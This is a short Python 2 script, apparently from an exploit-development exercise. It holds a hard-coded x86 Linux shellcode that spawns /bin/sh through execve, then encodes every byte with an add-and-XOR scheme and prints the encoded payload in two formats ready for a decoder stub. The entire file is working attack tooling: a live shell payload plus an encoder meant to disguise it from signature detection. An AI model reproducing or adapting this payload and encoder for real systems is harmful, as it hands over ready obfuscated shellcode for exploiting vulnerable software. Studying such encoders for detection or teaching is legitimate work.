#!/usr/bin/python

Shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

for x in bytearray(Shellcode) :
        y = x + 0x3
        c = y ^ 0xBA
        encoded += '\\x'
        encoded += '%02x' % c
        encoded2 += '0x'
        encoded2 += '%02x,' %c
        
print 'Length: %d' % len(bytearray(Shellcode))
print 'Format 1: %s' % encoded
print 'Format 2: %s' % encoded2.rstrip(',')
